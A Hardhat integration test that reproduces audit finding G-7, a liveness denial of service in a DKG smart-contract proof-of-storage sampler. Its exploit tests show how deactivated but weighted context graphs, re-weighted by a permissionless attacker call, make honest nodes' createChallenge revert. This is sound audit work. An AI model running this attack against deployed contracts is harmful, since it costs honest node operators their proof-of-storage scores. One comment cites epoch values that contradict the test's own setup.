import { loadFixture, time } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from 'chai';
import { ethers } from 'ethers';
import hre from 'hardhat';

import {
  RandomSampling,
  RandomSamplingStorage,
  Chronos,
  DKGKnowledgeAssets,
  Profile,
  Hub,
  ShardingTable,
  ContextGraphStorage,
  ContextGraphValueStorage,
  CGWeightTreeStorage,
  ContextGraphs,
  KnowledgeAssetsLifecycle,
  Token,
} from '../../typechain';
import { createProfile } from '../helpers/profile-helpers';

/**
 * ============================================================================
 * PoC for AUDIT FINDING G-7 (HIGH) — proof-of-storage liveness DoS via a
 * swept/deactivated context graph that is RE-STRANDED with sampling weight.
 * ============================================================================
 *
 * The CG value-write path (`extendKnowledgeAssetLifetime`, and the
 * `update`/`_executeUpdateCore` path) has NO `isContextGraphActive(cgId)` gate.
 * `deactivateContextGraph` only flips `active = false`; it does NOT zero the
 * Fenwick (BIT) weight leaf for the CG. `CGWeightTreeStorage.settle` sets the
 * leaf to `getCGValueAtEpoch(cg, currentEpoch)` — the RAW ledger truth, with no
 * active-status check — so it happily RE-STRANDS a nonzero weighted leaf for an
 * INACTIVE CG.
 *
 * In `RandomSampling._pickKa` a drawn CG that fails `isContextGraphActive`
 * returns `found == false` (RandomSampling.sol:611). The production picker
 * `_pickWeightedChallengeFull` treats that as a MISS: it settles-on-miss,
 * excludes the CG, and BURNS one of only `MAX_CG_RETRIES = 5` attempts. The
 * settle-on-miss does NOT self-heal here, because the re-stranded leaf is
 * TRUTHFUL nonzero value (not an over-stated/expired leaf), so settle keeps it
 * nonzero. Therefore >= 5 inactive-but-weighted CGs that dominate the working
 * total each cost a retry and the loop reverts `NoEligibleKnowledgeAsset` even
 * though eligible ACTIVE CGs exist — bricking honest nodes' `createChallenge`,
 * hence `submitProof`, hence their proof-of-storage score for the period.
 *
 * The in-source comment at RandomSampling.sol:606 claims `deactivateContextGraph`
 * "has no production callers today, so this is the gate". That is STALE:
 * `ContextGraphs.sweepContextGraphEscrow` IS a wired production caller of
 * `deactivateContextGraph`.
 *
 * This test proves the finding on the REAL compiled contracts:
 *   CONTROL 1  — harness wired: one live weighted CG ⇒ createChallenge succeeds.
 *   CONTROL 2  — 4 inactive-but-weighted dominant CGs (below the 5-retry budget)
 *                + 1 live CG ⇒ createChallenge STILL succeeds (the picker
 *                self-heals on miss and re-draws). Pins the boundary, proving the
 *                DoS below is not "the picker is trivially broken".
 *   EXPLOIT A  — 5 inactive-but-weighted dominant CGs + 1 live CG ⇒
 *                createChallenge REVERTS NoEligibleKnowledgeAsset (liveness DoS).
 *   EXPLOIT B  — the FULL real vector end-to-end: admin `sweepContextGraphEscrow`
 *                (deactivates + zeros the leaf), then a NON-privileged attacker
 *                re-strands weight via the permissionless, ungated
 *                `extendKnowledgeAssetLifetime` ⇒ the inactive CG's leaf is
 *                nonzero again, and the admin cleanup (re-sweep) is bricked.
 */
describe('@integration PoC G-7: re-stranded deactivated CG → createChallenge DoS', () => {
  const SENTINEL_NO_PRIVATE = ethers.keccak256(
    ethers.toUtf8Bytes('DKG_NO_PRIVATE_DATA_V10'),
  );
  const publicContent = ethers.toUtf8Bytes('g7-public-leaf-content');
  const publicRoot = ethers.keccak256(publicContent);
  const merkleRoot = ethers.keccak256(
    ethers.concat([publicRoot, SENTINEL_NO_PRIVATE]),
  );

  const OPEN_POLICY = 1;
  const TEST_KA_BYTE_SIZE = 128n;

  let accounts: Awaited<ReturnType<typeof hre.ethers.getSigners>>;
  let opSigner: (typeof accounts)[number];
  let Hub: Hub;
  let RandomSampling: RandomSampling;
  let RandomSamplingStorage: RandomSamplingStorage;
  let Chronos: Chronos;
  let DKGKnowledgeAssets: DKGKnowledgeAssets;
  let Profile: Profile;
  let ShardingTable: ShardingTable;
  let ContextGraphStorage: ContextGraphStorage;
  let ContextGraphValueStorage: ContextGraphValueStorage;
  let CGWeightTreeStorage: CGWeightTreeStorage;
  let ContextGraphs: ContextGraphs;
  let KnowledgeAssetsLifecycle: KnowledgeAssetsLifecycle;
  let Token: Token;
  let kaNumber = 0n;

  async function deployFixture() {
    await hre.deployments.fixture([
      'Token', 'Hub', 'ParametersStorage', 'WhitelistStorage', 'IdentityStorage',
      'ShardingTableStorage', 'ShardingTable', 'StakingStorage', 'ProfileStorage',
      'Chronos', 'EpochStorage', 'DKGKnowledgeAssets', 'AskStorage', 'DelegatorsInfo',
      'RandomSamplingStorage', 'ContextGraphValueStorage', 'ContextGraphStorage',
      'RandomSampling', 'Profile',
      // G-7 specific: the sweep + value-write logic contracts.
      'ContextGraphs', 'KnowledgeAssetsLifecycle',
    ]);
    accounts = await hre.ethers.getSigners();
    Hub = await hre.ethers.getContract<Hub>('Hub');
    await Hub.setContractAddress('HubOwner', accounts[0].address);
    await Hub.setContractAddress('TestStorageOperator', accounts[19].address);

    RandomSampling = await hre.ethers.getContract<RandomSampling>('RandomSampling');
    RandomSamplingStorage = await hre.ethers.getContract<RandomSamplingStorage>('RandomSamplingStorage');
    Chronos = await hre.ethers.getContract<Chronos>('Chronos');
    DKGKnowledgeAssets = await hre.ethers.getContract<DKGKnowledgeAssets>('DKGKnowledgeAssets');
    Profile = await hre.ethers.getContract<Profile>('Profile');
    ShardingTable = await hre.ethers.getContract<ShardingTable>('ShardingTable');
    ContextGraphStorage = await hre.ethers.getContract<ContextGraphStorage>('ContextGraphStorage');
    ContextGraphValueStorage = await hre.ethers.getContract<ContextGraphValueStorage>('ContextGraphValueStorage');
    CGWeightTreeStorage = await hre.ethers.getContract<CGWeightTreeStorage>('CGWeightTreeStorage');
    ContextGraphs = await hre.ethers.getContract<ContextGraphs>('ContextGraphs');
    KnowledgeAssetsLifecycle = await hre.ethers.getContract<KnowledgeAssetsLifecycle>('KnowledgeAssetsLifecycle');
    Token = await hre.ethers.getContract<Token>('Token');
    await CGWeightTreeStorage.connect(accounts[19]).finishBackfill();
    opSigner = accounts[19];
    kaNumber = 0n;
  }

  function nextKaId(): bigint {
    kaNumber += 1n;
    return (BigInt(opSigner.address) << 96n) | kaNumber;
  }

  async function createPublicCG(): Promise<bigint> {
    await (
      await ContextGraphStorage.connect(opSigner).createContextGraph(
        accounts[1].address, [], 0, 0, OPEN_POLICY, ethers.ZeroAddress, 0, ethers.ZeroHash,
      )
    ).wait();
    return ContextGraphStorage.getLatestContextGraphId();
  }

  // Seed a KA on a CG with an explicit value window + per-epoch weight, settle the leaf.
  async function seedKaCustom(
    cgId: bigint,
    kaEndEpoch: bigint,
    valueStartEpoch: bigint,
    lifetime: bigint,
    value: bigint,
  ): Promise<bigint> {
    const currentEpoch = await Chronos.getCurrentEpoch();
    const receipt = await (
      await DKGKnowledgeAssets.connect(opSigner).createKnowledgeAsset(
        opSigner.address, opSigner.address, nextKaId(), 'g7-poc',
        merkleRoot, 1, TEST_KA_BYTE_SIZE, currentEpoch, kaEndEpoch, 0, false, 1,
      )
    ).wait();
    const iface = DKGKnowledgeAssets.interface;
    const topic = iface.getEvent('KnowledgeAssetCreated')!.topicHash;
    const log = receipt!.logs.find((l) => l.topics[0] === topic)!;
    const kaId = iface.parseLog(log as unknown as { topics: string[]; data: string })!.args[0] as bigint;
    await (await ContextGraphStorage.connect(opSigner).registerKnowledgeAssetToContextGraph(cgId, kaId)).wait();
    await (await ContextGraphValueStorage.connect(opSigner).addCGValueForEpochRange(cgId, valueStartEpoch, lifetime, value)).wait();
    await (await CGWeightTreeStorage.connect(opSigner).settle(cgId)).wait();
    return kaId;
  }

  // A dominant CG that is DEACTIVATED but keeps its nonzero settled leaf — exactly
  // the state `sweepContextGraphEscrow` + a later re-strand produces. The leaf stays
  // nonzero because `deactivateContextGraph` never zeroes it and we settle while value
  // is live. Direct `deactivateContextGraph` is the owner-as-onlyContracts SEEDING
  // shortcut for the inactive-but-weighted state (EXPLOIT B drives the full real path).
  async function seedInactiveDominantCG(): Promise<bigint> {
    const epoch = await Chronos.getCurrentEpoch();
    const cg = await createPublicCG();
    await seedKaCustom(cg, epoch + 1000n, epoch, 1000n, 10n ** 24n); // dominant weight
    expect(await CGWeightTreeStorage.cgWeight(cg)).to.be.greaterThan(0n);
    // @ts-expect-error – onlyContracts seeder (accounts[19]) drives deactivation directly.
    await (await ContextGraphStorage.connect(opSigner).deactivateContextGraph(cg)).wait();
    expect(await ContextGraphStorage.isContextGraphActive(cg)).to.equal(false);
    // The defining bug: the leaf is STILL nonzero after deactivation (never zeroed).
    expect(await CGWeightTreeStorage.cgWeight(cg)).to.be.greaterThan(0n);
    return cg;
  }

  async function seedLiveCG(): Promise<{ cgId: bigint; kaId: bigint }> {
    const epoch = await Chronos.getCurrentEpoch();
    const cgId = await createPublicCG();
    const kaId = await seedKaCustom(cgId, epoch + 1000n, epoch, 1000n, 1000n); // tiny weight
    return { cgId, kaId };
  }

  async function setupChallengingNode() {
    const node = { operational: accounts[2], admin: accounts[1] };
    const { identityId } = await createProfile(Profile, node);
    // @ts-expect-error – direct insertNode for test setup (owner bypasses onlyContracts)
    await ShardingTable.connect(accounts[0]).insertNode(identityId);
    return { ...node, identityId };
  }

  beforeEach(async () => {
    hre.helpers.resetDeploymentsJson();
    await loadFixture(deployFixture);
  });

  // ────────────────────────────────────────────────────────────────────────
  // CONTROL 1 — one live weighted CG ⇒ honest createChallenge succeeds.
  // ────────────────────────────────────────────────────────────────────────
  it('CONTROL: createChallenge succeeds against a single live weighted CG', async () => {
    const { kaId } = await seedLiveCG();
    const node = await setupChallengingNode();

    await RandomSampling.updateAndGetActiveProofPeriodStartBlock();
    await RandomSampling.connect(node.operational).createChallenge();

    const ch = await RandomSamplingStorage.getNodeChallenge(node.identityId);
    expect(ch.knowledgeAssetId).to.equal(kaId);
    expect(ch.solved).to.equal(false);
  });

  // ────────────────────────────────────────────────────────────────────────
  // CONTROL 2 — 4 inactive-but-weighted dominant CGs (< MAX_CG_RETRIES=5) + 1
  // live CG ⇒ createChallenge STILL succeeds. Each inactive draw burns one retry
  // but the budget (5) is not exhausted, so the picker re-draws onto the live CG.
  // This proves the picker is NOT trivially broken and pins the 5-retry boundary.
  // ────────────────────────────────────────────────────────────────────────
  it('CONTROL: 4 inactive-but-weighted dominant CGs do NOT starve the draw (below the 5-retry budget)', async () => {
    for (let i = 0; i < 4; i++) await seedInactiveDominantCG();
    const { kaId } = await seedLiveCG();
    const node = await setupChallengingNode();

    await RandomSampling.updateAndGetActiveProofPeriodStartBlock();
    // Must not revert; the live CG is reachable within the retry budget.
    await RandomSampling.connect(node.operational).createChallenge();

    const ch = await RandomSamplingStorage.getNodeChallenge(node.identityId);
    // The only ACTIVE CG is the live one, so the draw must land on its KA.
    expect(ch.knowledgeAssetId).to.equal(kaId);
  });

  // ────────────────────────────────────────────────────────────────────────
  // EXPLOIT A — 5 inactive-but-weighted dominant CGs + 1 live CG ⇒
  // createChallenge REVERTS NoEligibleKnowledgeAsset. The 5 dominant inactive
  // leaves consume all MAX_CG_RETRIES attempts before the live CG can be drawn,
  // so an honest node cannot create a challenge even though an eligible active
  // CG exists. This is the proof-of-storage liveness DoS.
  // ────────────────────────────────────────────────────────────────────────
  it('EXPLOIT: 5 inactive-but-weighted dominant CGs brick createChallenge for an honest node', async () => {
    const inactive: bigint[] = [];
    for (let i = 0; i < 5; i++) inactive.push(await seedInactiveDominantCG());
    const { cgId: liveCg } = await seedLiveCG();
    const node = await setupChallengingNode();

    // Sanity: an eligible ACTIVE CG with nonzero weight exists.
    expect(await ContextGraphStorage.isContextGraphActive(liveCg)).to.equal(true);
    expect(await CGWeightTreeStorage.cgWeight(liveCg)).to.be.greaterThan(0n);
    // Sanity: every inactive CG dominates the live CG's weight (so they get drawn first).
    const liveWeight = await CGWeightTreeStorage.cgWeight(liveCg);
    for (const cg of inactive) {
      expect(await ContextGraphStorage.isContextGraphActive(cg)).to.equal(false);
      expect(await CGWeightTreeStorage.cgWeight(cg)).to.be.greaterThan(liveWeight * 10n ** 6n);
    }

    await RandomSampling.updateAndGetActiveProofPeriodStartBlock();
    await expect(
      RandomSampling.connect(node.operational).createChallenge(),
    ).to.be.revertedWithCustomError(RandomSampling, 'NoEligibleKnowledgeAsset');

    // The node has no challenge ⇒ it cannot submitProof ⇒ zero score this period.
    const ch = await RandomSamplingStorage.getNodeChallenge(node.identityId);
    expect(ch.knowledgeAssetId).to.equal(0n);
  });

  // ────────────────────────────────────────────────────────────────────────
  // EXPLOIT B — the FULL real vector, no onlyContracts shortcut for the attack:
  //   1. Admin (Hub owner) performs the INTENDED retire action:
  //      ContextGraphs.sweepContextGraphEscrow(X) — settle zeroes X's leaf,
  //      getCurrentCGValue(X)==0 passes, X is deactivated, escrow swept.
  //   2. A NON-privileged attacker calls the permissionless, UNGATED
  //      KnowledgeAssetsLifecycle.extendKnowledgeAssetLifetime(kaInX, ...) — there
  //      is NO isContextGraphActive gate, so it writes value over the inactive CG
  //      and settle RE-STRANDS a nonzero leaf.
  //   3. The intended admin cleanup (re-sweep) is now BRICKED ("CG has live value").
  // This is the exact re-strand the picker DoS (EXPLOIT A) feeds on, reached with
  // only an owner sweep + a permissionless attacker call.
  // ────────────────────────────────────────────────────────────────────────
  it('EXPLOIT: sweep deactivates a CG, then a non-privileged attacker re-strands its sampling weight via extendKnowledgeAssetLifetime (no active gate)', async () => {
    const attacker = accounts[5];
    const epoch = await Chronos.getCurrentEpoch();

    // ── Build CG X at the exact sweepable boundary the finding calls out:
    //    currentEpoch == endEpoch. The publish value window [epoch, epoch+1) is
    //    live ONLY at `epoch`; the KA's endEpoch is `epoch+1`. We then advance one
    //    epoch so currentEpoch == endEpoch == epoch+1: the value window has
    //    retracted to 0 (getCurrentCGValue==0 ⇒ sweep allowed) yet the KA is NOT
    //    lifecycle-expired (the guard is `currentEpoch > endEpoch`, false at `==`),
    //    so extendKnowledgeAssetLifetime still proceeds and writes value over
    //    [endEpoch, endEpoch+epochs) = [currentEpoch, ...). ──
    const cgX = await createPublicCG();
    const kaInX = await seedKaCustom(cgX, epoch + 1n, epoch, 1n, 1000n);
    // Seed registration escrow so the admin sweep finds escrow to reclaim.
    await (await ContextGraphStorage.connect(opSigner).setRegistrationEscrow(cgX, 1_000n)).wait();

    // Advance to the boundary epoch: currentEpoch == endEpoch == epoch+1.
    await time.increase(Number(await Chronos.epochLength()));
    expect(await Chronos.getCurrentEpoch()).to.equal(epoch + 1n);
    expect(await DKGKnowledgeAssets.getEndEpoch(kaInX)).to.equal(epoch + 1n);
    expect(await ContextGraphValueStorage.getCurrentCGValue(cgX)).to.equal(0n); // sweepable now
    expect(await ContextGraphStorage.isContextGraphActive(cgX)).to.equal(true);

    // ── Step 1: admin retires the CG via the REAL sweep path. ──
    await (await ContextGraphs.connect(accounts[0]).sweepContextGraphEscrow(cgX)).wait();
    expect(await ContextGraphStorage.isContextGraphActive(cgX)).to.equal(false); // deactivated
    expect(await CGWeightTreeStorage.cgWeight(cgX)).to.equal(0n); // sweep settled leaf to 0

    // ── Step 2: a NON-privileged attacker re-strands weight via the ungated extend. ──
    // Fund + approve the attacker; KnowledgeAssetsLifecycle pulls TRAC from msg.sender.
    const extendAmount = 1_000_000n;
    await (await Token.mint(attacker.address, extendAmount)).wait();
    await (await Token.connect(attacker).approve(await KnowledgeAssetsLifecycle.getAddress(), extendAmount)).wait();

    // endEpoch of kaInX is epoch+50, currentEpoch is `epoch` ⇒ currentEpoch <= endEpoch,
    // so the only liveness guard (currentEpoch > endEpoch) does NOT fire. No active gate exists.
    await (
      await KnowledgeAssetsLifecycle.connect(attacker).extendKnowledgeAssetLifetime(kaInX, 5, extendAmount)
    ).wait();

    // The CG is STILL inactive, yet its sampling weight leaf is nonzero again:
    // the value-write path re-stranded a deactivated CG. THIS is the core G-7 bug.
    expect(await ContextGraphStorage.isContextGraphActive(cgX)).to.equal(false);
    expect(await CGWeightTreeStorage.cgWeight(cgX)).to.be.greaterThan(0n);
    expect(await ContextGraphValueStorage.getCurrentCGValue(cgX)).to.be.greaterThan(0n);

    // ── Step 3: the admin cleanup is bricked — re-sweep reverts on the re-stranded value. ──
    await expect(
      ContextGraphs.connect(accounts[0]).sweepContextGraphEscrow(cgX),
    ).to.be.revertedWithCustomError(ContextGraphs, 'InvalidContextGraphConfig');
  });
});
